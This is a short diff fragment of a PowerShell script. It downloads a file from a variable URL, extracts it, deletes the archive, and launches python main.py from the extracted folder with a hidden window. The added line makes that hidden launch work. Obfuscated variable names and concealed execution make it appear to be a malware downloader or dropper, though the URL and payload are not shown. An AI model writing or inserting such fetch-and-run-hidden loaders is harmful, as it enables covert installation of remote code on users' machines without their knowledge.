@@ -10,5 +10,6 @@ Invoke-WebRequest -Uri $ltrmn -OutFile $kdsf
 tar -xf $kdsf -C $cwab
 
 Remove-Item $kdsf -Force
+Start-Process -FilePath python.exe -ArgumentList 'main.py' -WorkingDirectory $cwab -WindowStyle Hidden
 
-Start-Process -FilePath $gqjd main.py -WindowStyle Hidden
+
